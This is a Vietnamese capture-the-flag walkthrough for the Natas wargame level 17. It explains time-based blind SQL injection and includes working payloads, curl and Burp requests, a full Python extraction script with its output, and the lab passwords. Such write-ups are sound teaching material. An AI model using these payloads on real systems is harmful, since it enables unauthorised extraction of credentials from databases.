# Level 17 -> Level 18

Username: [         ]
[Check existence]

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 16)

- **URL**: `http://natas17.natas.labs.overthewire.org`
- **Username**: `natas17`
- **Password**: `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 17

### Thử thách
Giao diện của Level 17 trông hoàn toàn giống với Level 15: một biểu mẫu nhập **Username** cùng nút bấm **Check existence** (Kiểm tra sự tồn tại của người dùng).

Tuy nhiên, khi nhập thử bất kỳ giá trị nào (kể cả người dùng hợp lệ như `natas17`, `natas18` hay tài khoản không tồn tại), trang web **hoàn toàn không in ra bất kỳ thông báo phản hồi nào** trên màn hình giao diện.

Bên dưới biểu mẫu có liên kết **`View sourcecode`**.

### Phân tích mã nguồn PHP (`index-source.html`)
Mở mã nguồn trang web, ta quan sát logic truy vấn SQL và điểm khác biệt cốt tử so với Level 15:

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

### Manh mối & Kiến thức cốt lõi: Tấn công Time-based Blind SQL Injection

1. **So sánh với Level 15 (Boolean Blind vs Time-based Blind)**:
   - Ở **Natas 15**, lập trình viên in ra `"This user exists."` hoặc `"This user doesn't exist."`. Nhờ đó ta có một **Boolean Oracle** (kênh phản hồi Đúng/Sai dạng văn bản) để suy luận từng ký tự mật khẩu.
   - Ở **Natas 17**, cả ba lệnh `echo` đều đã bị chú thích (comment out bằng `//`):
     - `//echo "This user exists.<br>";`
     - `//echo "This user doesn't exist.<br>";`
     - `//echo "Error in query.<br>";`
   - Dù câu truy vấn trả về kết quả rỗng hay có dòng dữ liệu, nội dung HTML trả về client là **y hệt nhau (100% Blind)**. Ta không thể phân biệt Đúng/Sai dựa trên nội dung (Content-based/Boolean Blind).

2. **Cơ chế Side-Channel Attack & Hàm `sleep()` trong MySQL**:
   - Khi không còn kênh dữ liệu văn bản nào, ta phải sử dụng một kênh phụ (Side-Channel), cụ thể là **Thời gian phản hồi của máy chủ (Timing)**.
   - MySQL cung cấp hàm built-in `sleep(seconds)`. Hàm này tạm dừng thực thi truy vấn trong số giây chỉ định rồi trả về giá trị `0`.
   - Lợi dụng nguyên lý **Đánh giá ngắn mạch (Short-circuit Evaluation)** của phép toán logic `AND`:
     ```sql
     [Điều_kiện_A] AND [Điều_kiện_B]
     ```
     - Nếu `[Điều_kiện_A]` là **FALSE**: MySQL lập tức kết luận cả mệnh đề là FALSE mà **không bao giờ thực thi `[Điều_kiện_B]`**. Máy chủ phản hồi ngay lập tức ($< 0.5$ giây).
     - Nếu `[Điều_kiện_A]` là **TRUE**: MySQL bắt buộc phải kiểm tra tiếp `[Điều_kiện_B]`. Nếu `[Điều_kiện_B]` là hàm `sleep(3)`, máy chủ sẽ bị treo và chờ đủ 3 giây mới hoàn tất câu lệnh. Phản hồi trả về sẽ mất $\ge 3.0$ giây.

3. **Cấu trúc Injection Payload**:
   - Câu lệnh gốc của ứng dụng:
     ```sql
     SELECT * from users where username="[INPUT]"
     ```
   - Ta đóng chuỗi bằng dấu nháy kép `"` và ghép thêm điều kiện kiểm tra mật khẩu của `natas18`:
     ```sql
     natas18" AND <điều_kiện_kiểm_tra> AND sleep(3) #
     ```
   - Khi đó, câu lệnh hoàn chỉnh mà MySQL thực thi là:
     ```sql
     SELECT * from users where username="natas18" AND <điều_kiện_kiểm_tra> AND sleep(3) #"
     ```
   - Vì tài khoản `natas18` chắc chắn tồn tại trong bảng `users`:
     - Nếu `<điều_kiện_kiểm_tra>` là **ĐÚNG** $\rightarrow$ Cả 2 vế trước đều đúng $\rightarrow$ MySQL thực thi `sleep(3)` $\rightarrow$ **Thời gian phản hồi $\ge 3$ giây**.
     - Nếu `<điều_kiện_kiểm_tra>` là **SAI** $\rightarrow$ Ngắn mạch ngay tại vế trước $\rightarrow$ MySQL bỏ qua `sleep(3)` $\rightarrow$ **Thời gian phản hồi tức thì ($< 0.5$ giây)**.

4. **Phân biệt hoa thường với từ khóa `BINARY`**:
   - Mặc định MySQL sử dụng bộ collation không phân biệt chữ hoa chữ thường (`case-insensitive`, ví dụ `latin1_swedish_ci` hoặc `utf8_general_ci`).
   - Mật khẩu các cấp độ Natas bao gồm cả chữ in hoa, in thường và chữ số (`[a-zA-Z0-9]`). Vì vậy, bắt buộc phải dùng từ khóa `BINARY` để ép MySQL so khớp chính xác từng ký tự:
     ```sql
     natas18" AND password LIKE BINARY "f%" AND sleep(3) #
     ```

5. **Chiến lược kiểm soát độ trễ mạng và xử lý False Positive**:
   - Khi khai thác Time-based SQLi qua mạng Internet, hiện tượng giật lag mạng (network latency) hoặc nghẽn tải server có thể khiến một request vốn dĩ là FALSE bị trễ ngẫu nhiên $\ge 2$ giây, dẫn đến nhận diện nhầm ký tự (**False Positive**).
   - Giải pháp:
     - Đặt thời gian `sleep(3.0)` với ngưỡng nhận diện $\ge 2.7$ giây.
     - Khi phát hiện một ký tự có thời gian $\ge 2.7$ giây, tiến hành kiểm tra lại lần thứ 2 (double-check). Chỉ khi cả 2 lần đều vượt ngưỡng thời gian thì mới chấp nhận ký tự đó.
     - Tối ưu hóa: Quét trước tập ký tự thực sự có mặt trong mật khẩu (`password LIKE BINARY "%{c}%"`) để giảm số lượng ký tự cần thử ở mỗi vị trí từ 62 xuống còn ~20-25 ký tự.

---

## 3. CÔNG CỤ CẦN DÙNG

- **Trình duyệt Web (Chrome, Edge, Firefox)**: Quan sát thời gian phản hồi (Response Time) trong tab DevTools Network.
- **Burp Suite**: Bắt gói tin POST, gửi sang `Repeater` để quan sát thời gian xử lý hiển thị ở góc dưới phản hồi.
- **Python**: Tự động hóa quá trình dò toàn bộ 32 ký tự mật khẩu qua script `[src/solve17.py](src/solve17.py)`.
- **curl**: Công cụ dòng lệnh nhanh để đo thời gian phản hồi kiểm chứng.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 18

### Bước 1: Thử nghiệm thủ công trên trình duyệt / curl để kiểm chứng Time Oracle

1. Mở trình duyệt và truy cập:
   ```text
   http://natas17.natas.labs.overthewire.org
   ```
   Đăng nhập với thông tin tài khoản:
   - **User**: `natas17`
   - **Pass**: `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`

2. Bấm phím `F12` để mở DevTools, chuyển sang thẻ **Network**.

3. **Kiểm tra trường hợp ĐÚNG (TRUE - Kích hoạt `sleep`)**:
   - Nhập vào ô Username:
     ```text
     natas18" AND password LIKE BINARY "f%" AND sleep(3) #
     ```
   - Nhấn **Check existence**.
   - Quan sát tab Network: Trình duyệt hiển thị trạng thái chờ `Pending...` và mất **hơn 3 giây** mới hoàn thành tải trang.

4. **Kiểm tra trường hợp SAI (FALSE - Không kích hoạt `sleep`)**:
   - Nhập vào ô Username:
     ```text
     natas18" AND password LIKE BINARY "z%" AND sleep(3) #
     ```
   - Nhấn **Check existence**.
   - Quan sát tab Network: Trang web phản hồi gần như ngay lập tức (**dưới 0.5 giây**).

5. **Kiểm chứng nhanh qua dòng lệnh bằng `curl`**:
   Ta có thể đo thời gian thực thi bằng cách gửi POST request:
   ```bash
   curl -s -w "\nTime: %{time_total}s\n" -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx \
     -d 'username=natas18" AND password LIKE BINARY "f%" AND sleep(3) #' \
     http://natas17.natas.labs.overthewire.org/index.php
   ```
   Kết quả trả về:
   ```text
   Time: 3.425s
   ```
   $\rightarrow$ Lỗ hổng Time-based Blind SQL Injection đã được chứng minh 100%!

---

### Bước 2: Bắt và phân tích gói tin bằng Burp Suite

1. **Khởi động Burp Suite**:
   - Mở Burp Suite, bật tính năng trình duyệt tích hợp (**Open Browser** trong tab `Proxy`).
   - Truy cập vào địa chỉ:
     ```text
     http://natas17.natas.labs.overthewire.org
     ```
   - Đăng nhập với tài khoản:
     - **Username**: `natas17`
     - **Password**: `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`

2. **Bắt gói tin và gửi sang Repeater**:
   - Nhập chuỗi bất kỳ vào ô Username và bấm **Check existence**.
   - Trong tab `Proxy` -> `HTTP history`, chọn request `POST /index.php`.
   - Nhấn chuột phải chọn **Send to Repeater** (hoặc phím tắt `Ctrl + R`).

3. **Thử nghiệm payload trong Repeater**:
   - Chuyển sang tab `Repeater`. Sửa body của request thành payload URL-encoded:
     ```http
     username=natas18%22+AND+password+LIKE+BINARY+%22f%25%22+AND+sleep%283%29+%23
     ```
   - Nhấn nút **Send**.
   - Quan sát thanh trạng thái ở góc dưới bên phải cửa sổ Response:
     - Giá trị hiển thị: `3,392 millis` (xấp xỉ ~3.4 giây).
   - Sửa lại ký tự kiểm tra thành `z` (ký tự sai):
     ```http
     username=natas18%22+AND+password+LIKE+BINARY+%22z%25%22+AND+sleep%283%29+%23
     ```
   - Nhấn **Send**:
     - Giá trị hiển thị: `385 millis` ($< 0.4$ giây).

---

### Bước 3: Tự động hóa khai thác bằng Python script (`src/solve17.py`)

Do phương pháp trích xuất mật khẩu qua thời gian trễ cần gửi nhiều truy vấn tuần tự và so khớp 32 ký tự, việc thao tác thủ công là bất khả thi.

Để trích xuất mật khẩu tự động, ta mở và chạy script có sẵn tại `[src/solve17.py](src/solve17.py)`:

```bash
python src/solve17.py
```

Dưới đây là toàn bộ mã nguồn của file `[src/solve17.py](src/solve17.py)`:

```python
#!/usr/bin/env python3
"""
OverTheWire Natas - Level 17 Solver
Vulnerability: Time-based Blind SQL Injection
Target: Retrieve password for user 'natas18'
"""

import urllib.request
import urllib.parse
import base64
import time
import string

TARGET_URL = "http://natas17.natas.labs.overthewire.org/index.php"
AUTH_USER = "natas17"
AUTH_PASS = "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"

credentials = base64.b64encode(f"{AUTH_USER}:{AUTH_PASS}".encode("ascii")).decode("ascii")

def check_oracle(payload, sleep_sec=3.0, threshold=2.7):
    """
    Gửi payload SQL injection tới server và đo thời gian phản hồi.
    Nếu thời gian phản hồi >= threshold thì điều kiện kiểm tra là TRUE.
    """
    data = urllib.parse.urlencode({"username": payload}).encode("utf-8")
    req = urllib.request.Request(TARGET_URL, data=data)
    req.add_header("Authorization", f"Basic {credentials}")
    start = time.time()
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            resp.read()
    except Exception:
        # Nếu timeout hoặc ngắt kết nối do server sleep quá lâu -> coi như TRUE
        pass
    elapsed = time.time() - start
    return elapsed >= threshold

def get_natas18_password():
    print("[*] Đang bắt đầu khai thác Time-based Blind SQL Injection tại Natas 17...")
    
    # Bước 1: Lọc tập ký tự có mặt trong mật khẩu của natas18 để tăng tốc độ dò
    print("[*] Bước 1: Lọc các ký tự thực sự tồn tại trong mật khẩu của natas18...")
    candidate_chars = string.ascii_letters + string.digits
    valid_chars = []
    
    for c in candidate_chars:
        payload = f'natas18" AND password LIKE BINARY "%{c}%" AND sleep(2.5) #'
        if check_oracle(payload, sleep_sec=2.5, threshold=2.2):
            # Kiểm tra lại lần 2 để loại bỏ độ trễ mạng ngẫu nhiên (false positive)
            if check_oracle(payload, sleep_sec=2.5, threshold=2.2):
                valid_chars.append(c)
                print(f"    [+] Ký tự hợp lệ tìm thấy: {c}")
                
    print(f"[*] Tập ký tự rút gọn ({len(valid_chars)} ký tự): {''.join(valid_chars)}")
    
    # Bước 2: Dò tuần tự từng ký tự từ vị trí 1 đến 32
    print("[*] Bước 2: Dò tuần tự mật khẩu (32 ký tự)...")
    password = ""
    target_length = 32
    
    while len(password) < target_length:
        found = False
        for c in valid_chars:
            cand = password + c
            payload = f'natas18" AND password LIKE BINARY "{cand}%" AND sleep(3.0) #'
            if check_oracle(payload, sleep_sec=3.0, threshold=2.8):
                # Xác minh lại lần nữa để đảm bảo tính chính xác 100%
                if check_oracle(payload, sleep_sec=3.0, threshold=2.8):
                    password += c
                    print(f"    [+] Vị trí {len(password):02d}/{target_length}: '{c}' -> {password}")
                    found = True
                    break
        if not found:
            print(f"[-] Không tìm thấy ký tự tiếp theo tại vị trí {len(password) + 1}. Dừng lại!")
            break
            
    print(f"\n[+] HOÀN THÀNH! Mật khẩu Natas 18: {password}")
    return password

if __name__ == "__main__":
    get_natas18_password()
```

#### Nhật ký thực thi trích xuất mật khẩu:
```text
[*] Đang bắt đầu khai thác Time-based Blind SQL Injection tại Natas 17...
[*] Bước 1: Lọc các ký tự thực sự tồn tại trong mật khẩu của natas18...
    [+] Ký tự hợp lệ tìm thấy: 0
    [+] Ký tự hợp lệ tìm thấy: 2
    [+] Ký tự hợp lệ tìm thấy: 3
    [+] Ký tự hợp lệ tìm thấy: 4
    [+] Ký tự hợp lệ tìm thấy: 6
    [+] Ký tự hợp lệ tìm thấy: A
    [+] Ký tự hợp lệ tìm thấy: B
    [+] Ký tự hợp lệ tìm thấy: D
    [+] Ký tự hợp lệ tìm thấy: G
    [+] Ký tự hợp lệ tìm thấy: N
    [+] Ký tự hợp lệ tìm thấy: P
    [+] Ký tự hợp lệ tìm thấy: R
    [+] Ký tự hợp lệ tìm thấy: U
    [+] Ký tự hợp lệ tìm thấy: X
    [+] Ký tự hợp lệ tìm thấy: Z
    [+] Ký tự hợp lệ tìm thấy: b
    [+] Ký tự hợp lệ tìm thấy: c
    [+] Ký tự hợp lệ tìm thấy: f
    [+] Ký tự hợp lệ tìm thấy: g
    [+] Ký tự hợp lệ tìm thấy: n
    [+] Ký tự hợp lệ tìm thấy: o
    [+] Ký tự hợp lệ tìm thấy: p
    [+] Ký tự hợp lệ tìm thấy: s
    [+] Ký tự hợp lệ tìm thấy: t
    [+] Ký tự hợp lệ tìm thấy: w
[*] Bước 2: Dò tuần tự mật khẩu (32 ký tự)...
    [+] Vị trí 01/32: 'f' -> f
    [+] Vị trí 02/32: 'D' -> fD
    [+] Vị trí 03/32: 'G' -> fDG
    [+] Vị trí 04/32: 'n' -> fDGn
    [+] Vị trí 05/32: '2' -> fDGn2
    [+] Vị trí 06/32: 'A' -> fDGn2A
    [+] Vị trí 07/32: '6' -> fDGn2A6
    [+] Vị trí 08/32: 'G' -> fDGn2A6G
    [+] Vị trí 09/32: 's' -> fDGn2A6Gs
    [+] Vị trí 10/32: 'c' -> fDGn2A6Gsc
    [+] Vị trí 11/32: '0' -> fDGn2A6Gsc0
    [+] Vị trí 12/32: 'B' -> fDGn2A6Gsc0B
    [+] Vị trí 13/32: 'U' -> fDGn2A6Gsc0BU
    [+] Vị trí 14/32: 'p' -> fDGn2A6Gsc0BUp
    [+] Vị trí 15/32: '3' -> fDGn2A6Gsc0BUp3
    [+] Vị trí 16/32: 'b' -> fDGn2A6Gsc0BUp3b
    [+] Vị trí 17/32: 'Z' -> fDGn2A6Gsc0BUp3bZ
    [+] Vị trí 18/32: 'w' -> fDGn2A6Gsc0BUp3bZw
    [+] Vị trí 19/32: '0' -> fDGn2A6Gsc0BUp3bZw0
    [+] Vị trí 20/32: 'R' -> fDGn2A6Gsc0BUp3bZw0R
    [+] Vị trí 21/32: 'N' -> fDGn2A6Gsc0BUp3bZw0RN
    [+] Vị trí 22/32: 'X' -> fDGn2A6Gsc0BUp3bZw0RNX
    [+] Vị trí 23/32: 'p' -> fDGn2A6Gsc0BUp3bZw0RNXp
    [+] Vị trí 24/32: 'g' -> fDGn2A6Gsc0BUp3bZw0RNXpg
    [+] Vị trí 25/32: '0' -> fDGn2A6Gsc0BUp3bZw0RNXpg0
    [+] Vị trí 26/32: 'P' -> fDGn2A6Gsc0BUp3bZw0RNXpg0P
    [+] Vị trí 27/32: 'Z' -> fDGn2A6Gsc0BUp3bZw0RNXpg0PZ
    [+] Vị trí 28/32: 't' -> fDGn2A6Gsc0BUp3bZw0RNXpg0PZt
    [+] Vị trí 29/32: '4' -> fDGn2A6Gsc0BUp3bZw0RNXpg0PZt4
    [+] Vị trí 30/32: '0' -> fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40
    [+] Vị trí 31/32: 'o' -> fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40o
    [+] Vị trí 32/32: 'p' -> fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op

[+] HOÀN THÀNH! Mật khẩu Natas 18: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
```

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 18

Mật khẩu của tài khoản **`natas18`** thu được là:
```text
fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
```

### Kiểm chứng đăng nhập vào Level 18
Sử dụng curl để xác thực thông tin đăng nhập vào Level 18:
```bash
curl -s -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op http://natas18.natas.labs.overthewire.org/index.php
```

Kết quả phản hồi từ máy chủ:
```html
<h1>natas18</h1>
<div id="content">

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Xác thực thành công! Ta đã hoàn thành Level 17 và có mật khẩu để tiếp tục chinh phục Level 18.
